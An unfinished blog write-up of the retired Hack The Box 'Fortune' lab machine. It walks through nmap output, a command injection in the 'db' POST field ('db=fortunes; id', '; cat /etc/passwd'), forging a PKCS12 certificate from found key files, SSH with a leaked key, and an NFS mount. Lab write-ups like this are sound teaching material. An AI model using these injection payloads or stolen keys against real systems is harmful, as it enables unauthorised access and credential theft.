---
layout: post
title:  "Hack The Box: 'Fortune' Writeup"
image: ''
date:   2019-08-05 00:09:53
tags:
- hackthebox
- pkcs12 certificate
- RCE
- nfs share
- pgadmin4
- sqlite3
- crypto

description: ''
categories:
- Hack The Box
---

<style>

#myBtn {
  display: none;
  position: fixed;
  bottom: 40px;
  right: 50px;
  z-index: 99;
  font-size: 12px;
  border: 1px solid black;
  outline: black;
  background-color: #262626;
  color: white;
  cursor: pointer;
  padding: 10px 22px 10px 22px;
  border-radius: 10px;
  font-family: 'Open Sans';
}

#myBtn:hover {
  background-color: #5d4d7a;
}

applause-button {
		margin: auto;
	}

	.header-site .site-title {
      	padding-top: 5px;
      	color: white;
      	text-align: center;
      	font-weight: bold;
      	padding-left: 19px;
	}
	
	.fortune-img {
		max-width: 75%;
	}

	.post-content img { 
		margin: 1.875rem auto;
		display: block;
	}
</style>

<button onclick="topFunction()" id="myBtn" title="Go to top">↑</button>

<script>
// When the user scrolls down 20px from the top of the document, show the button
window.onscroll = function() {scrollFunction()};

function scrollFunction() {
  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
    document.getElementById("myBtn").style.display = "block";
  } else {
    document.getElementById("myBtn").style.display = "none";
  }
}

// When the user clicks on the button, scroll to the top of the document
function topFunction() {
  document.body.scrollTop = 0;
  document.documentElement.scrollTop = 0;
}
</script>

<!-- add the button style & script -->
<link rel="stylesheet" href="/assets/css/applause-button.css" />
<script src="/assets/js/applause-button.js"></script>

<img src="/assets/img/writeups/HTB-FORTUNE/HTB-FORTUNE-BADGE.PNG" class="fortune-img" alt="Hack The Box - Fortune">

<p><br></p>
### TL;DR 
There might not necessarily be anything "new" in this box if you've done all of the previous ones, but it's my absolute personal favorite. Thank you so much <a href="https://www.hackthebox.eu/home/users/profile/46317">AuxSarge</a> for creating it. I was so sad when it retired! 😢
<p><br></p>

### Overview

The `Fortune` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/46317">AuxSarge</a>) is a retired 50 point OpenBSD machine with some pretty interesting parts to it. If you have completed all of the previous boxes on Hack The Box, then `Fortune` should be pretty simple, as there is nothing particularly new introduced.
<p><br></p>

The box starts with simple web enumeration to locate RCE found in the site's `db` variable, which occurs when a semi colon (;) is appended to the end of the `db`. Next, some files are located via the RCE that can be used to create a PKCS12 certificate which permits access to port 443. From there, an SSH key is located to access the user called `nfsuser` and escalate to the user `charlie` by mounting a newly found nfs share and using `su` to access `charlie` with a local user that has the same UID. SSH keys for `charlie` are then used to access the user via SSH and enumerate further.
<p><br></p>

Finally, there is a `pgadmin4` database running on the box which contains hashes for the root password. A file called `crypto.py` is utilized for `pgadmin4's` encoding/decoding process, and can be used here to decode the root password and ultimately grab the flag.
<p><br></p>

### Nmap Scan

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HTB-FORTUNE# nmap -sC -sV -A -Pn 10.10.10.127

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 11:27 EST
Nmap scan report for 10.10.10.127
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (EdDSA)
80/tcp  open  http       syn-ack OpenBSD httpd
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https? syn-ack
|_ssl-date: TLS randomness does not represent time
</code></pre></div></div>

So, it appears port `443` is HTTPS (as expected), but it requires an SSL certificate to access it. I'll leave it alone for now because of this. However, port `80` proves to be quite interesting.
<p><br></p>

### Web Enumeration

Here's what I discovered upon navigating to `http://10.10.10.127/` in my browser:

<img src="/assets/img/writeups/HTB-FORTUNE/fortune-homepage.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">

Hmm... 

Let's try capturing a request with `Burp Suite`!

```
POST /select HTTP/1.1
Host: 10.10.10.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.127/
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

db=fortunes
```

The `db` variable looks pretty spicy! 🌶️

After running `wfuzz`, I discovered I could append a semi colon (;) to `db` and execute commands on the box, like so:

```
POST /select HTTP/1.1
Host: 10.10.10.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.127/
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

db=fortunes; id
```

And the response:
```
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8
Date: Wed, 24 Jul 2019 12:27:19
<!DOCTYPE html>
<html>
<head>
<title>Your fortune</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body>
<h2>Your fortune is:</h2>
<p><pre>

uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)


</pre><p>
<p>Try <a href='/'>again</a>!</p>
</body>
```

Nice! We have code execution. Let's have a look around to see what else we can find. 
<p><br></p>

### File Enumeration & NFS Share Access

(Shortened output for readability):

```
db=fortunes;cat /etc/passwd

charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
bob:*:1001:1001::/home/bob:/bin/ksh
nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
```

Well, well, well... It would appear we have three different users here. They are `charlie`, `bob`, and `nfsuser`. Immediately, `nfsuser` appears interesting to me given the naming convention. The username `nfsuser` can easily be attributed to an `nfs share`! Now, this is great and all, but I still don't know how to access these users, nor am I able to add my own `ssh` keys... I was able to `ping` myself at this point, but couldn't manage to get a shell back.
<p><br></p>

However, I did some snooping around and discovered some files in the user `bob`'s home directory (`/home/bob`). There was one cert file (`intermediate.cert.pem`) and one key file (`intermediate.key.pem`), which can be converted to a PKCS12 certificate. I used `openssl` to create the certificate, like so:

```
openssl pkcs12 -export -out fortune.htb.p12 -in intermediate.cert.pem -inkey intermediate.key.pem
```
I was then able to import the certificate with Firefox and access the (now unrestricted) `HTTPS` port, `443`.

This is the prompt I received upon importing my certificate:

<img src="/assets/img/writeups/HTB-FORTUNE/fortune-cert-prompt.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">

The `HTTPS` homepage displayed this message upon my first visit:

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You will need to use the local authpf service to obtain elevated network access. 
If you do not already have the appropriate SSH key pair, then you will need 
to <a href="https://10.10.10.127/generate">generate</a> one and configure your local system appropriately to proceed.
</code></pre></div></div>

I clicked on `generate` and it redirected me to a page that looked like this:

<a href="https://defarbs.com/assets/img/writeups/HTB-FORTUNE/fortune-generate-page.PNG">
  <img src="/assets/img/writeups/HTB-FORTUNE/fortune-generate-page.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">
<a>
# Note: If the above image is too small, click it to expand!

It looks like an SSH keypair appeared!

<img src="/assets/img/writeups/HTB-FORTUNE/surprised-pikachu.jpg" class="fortune-img" alt="Surprised Pikachu!">

This is great, because it means we can now access a user account! I threw the newly found keypair into respective files (`nfsuser_rsa` and `nfsuser_rsa.pub`). After doing some digging around with the RCE mentioned earlier, I noticed that `authpf` was installed, which is why I thusly associated the keys with the `nfsuser` account. I then tried using the ssh keypair I found at `/generate` to log in via SSH, like so:

```
+[root@kali: keys]$ ssh -i nfsuser_rsa nfsuser@10.10.10.127

Hello nfsuser. You are authenticated from host "10.10.14.34"
```

So, there appears to be some interesting output here. After authenticating via SSH, I ran another nmap scan to see what was *really* happening here. It turns out, logging in via SSH as `nfsuser` allows us to mount the `/home` directory as anyone we want! During prior enumeration, I located two other users: `bob` and `charlie`. I have already accessed `bob's` directory, but have not been able to access `charlie`. 

I ended up managing to mount `/home` locally by running the `mount` command like so:

```
mount -t nfs 10.10.10.127:/home /temp -o nolock
```

## Writeup In Progress... Stay tuned!

<div align="center">
	<h3> Thanks for reading! </h3>
</div>
<div align="center">
<!-- add the button! -->
<applause-button style="width: 58px; height: 58px;" color="#5d4d7a" url="https://defarbs.com/"/>
</div>
<div align="center">
	<a href="https://www.hackthebox.eu/profile/39047">
		<img htb-logo="image" src="https://www.hackthebox.eu/badge/image/39047" alt="Hack The Box">
	</a>
</div>